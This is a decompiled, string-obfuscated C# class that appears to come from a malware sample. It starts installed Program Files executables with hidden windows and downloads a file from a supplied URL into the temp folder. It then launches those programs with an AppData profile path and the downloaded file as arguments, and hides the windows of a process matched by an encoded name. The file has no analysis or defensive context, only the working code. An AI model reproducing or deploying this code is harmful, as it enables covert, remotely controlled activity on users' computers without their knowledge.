using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;

namespace ___codefort;

internal sealed class Class15
{
	public static string string_0 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + Class22.smethod_0(737972588);

	public static string string_1 = (Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + Class22.smethod_0(737972588)).Replace(Class22.smethod_0(737976117), Class22.smethod_0(737975489));

	public static string string_2 = (Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + Class22.smethod_0(737975515)).Replace(Class22.smethod_0(737976117), Class22.smethod_0(737975489));

	public static string string_3 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + Class22.smethod_0(737975515);

	public static string string_4 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + Class22.smethod_0(737975546);

	public static string string_5 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + Class22.smethod_0(737975546);

	public static string string_6 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class22.smethod_0(737972483);

	[DllImport("user32.dll")]
	private static extern int ShowWindow(int int_0, int int_1);

	public static void smethod_0()
	{
		if (File.Exists(string_0))
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.FileName = string_0;
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			Process.Start(processStartInfo);
		}
		else if (File.Exists(string_1))
		{
			ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
			processStartInfo2.FileName = string_1;
			processStartInfo2.WindowStyle = ProcessWindowStyle.Hidden;
			Process.Start(processStartInfo2);
		}
		else if (File.Exists(string_2))
		{
			ProcessStartInfo processStartInfo3 = new ProcessStartInfo();
			processStartInfo3.FileName = string_2;
			processStartInfo3.WindowStyle = ProcessWindowStyle.Hidden;
			Process.Start(processStartInfo3);
		}
		else if (File.Exists(string_3))
		{
			ProcessStartInfo processStartInfo4 = new ProcessStartInfo();
			processStartInfo4.FileName = string_3;
			processStartInfo4.WindowStyle = ProcessWindowStyle.Hidden;
			Process.Start(processStartInfo4);
		}
		if (File.Exists(string_4))
		{
			ProcessStartInfo processStartInfo5 = new ProcessStartInfo();
			processStartInfo5.FileName = string_4;
			processStartInfo5.WindowStyle = ProcessWindowStyle.Hidden;
			Process.Start(processStartInfo5);
		}
		else if (File.Exists(string_5))
		{
			ProcessStartInfo processStartInfo6 = new ProcessStartInfo();
			processStartInfo6.FileName = string_5;
			processStartInfo6.WindowStyle = ProcessWindowStyle.Hidden;
			Process.Start(processStartInfo6);
		}
	}

	public static bool smethod_1()
	{
		if (!File.Exists(string_0) && !File.Exists(string_1) && !File.Exists(string_2) && !File.Exists(string_3) && !File.Exists(string_4) && !File.Exists(string_5))
		{
			return false;
		}
		return true;
	}

	public static void smethod_2(string string_7)
	{
		string text = string.Concat(str2: new Random().Next(int.MinValue, int.MaxValue).ToString(), str0: Path.GetTempPath(), str1: Class22.smethod_0(737969724), str3: Class22.smethod_0(737973231));
		WebClient webClient = new WebClient();
		webClient.DownloadFile(string_7, text);
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.FileName = string_0;
			processStartInfo.Arguments = Class22.smethod_0(737973244) + string_6 + Class22.smethod_0(737969405) + text;
			Process.Start(processStartInfo);
		}
		catch
		{
			ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
			processStartInfo2.FileName = string_1;
			processStartInfo2.Arguments = Class22.smethod_0(737973244) + string_6 + Class22.smethod_0(737969405) + text;
			Process.Start(processStartInfo2);
		}
		ProcessStartInfo processStartInfo3 = new ProcessStartInfo();
		processStartInfo3.FileName = string_2;
		processStartInfo3.Arguments = Class22.smethod_0(737976090) + string_6 + Class22.smethod_0(737969405) + text;
		ProcessStartInfo processStartInfo4 = new ProcessStartInfo();
		processStartInfo4.FileName = string_3;
		processStartInfo4.Arguments = Class22.smethod_0(737976090) + string_6 + Class22.smethod_0(737969405) + text;
		ProcessStartInfo processStartInfo5 = new ProcessStartInfo();
		processStartInfo5.FileName = string_4;
		processStartInfo5.Arguments = Class22.smethod_0(737976090) + string_6 + Class22.smethod_0(737969405) + text;
		ProcessStartInfo processStartInfo6 = new ProcessStartInfo();
		processStartInfo6.FileName = string_5;
		processStartInfo6.Arguments = Class22.smethod_0(737976090) + string_6 + Class22.smethod_0(737969405) + text;
		Thread.Sleep(2000);
	}

	public static void smethod_3()
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (process.ProcessName.Contains(Class22.smethod_0(737973134)))
			{
				try
				{
					int int_ = process.MainWindowHandle.ToInt32();
					ShowWindow(int_, 0);
				}
				catch
				{
				}
			}
		}
	}
}
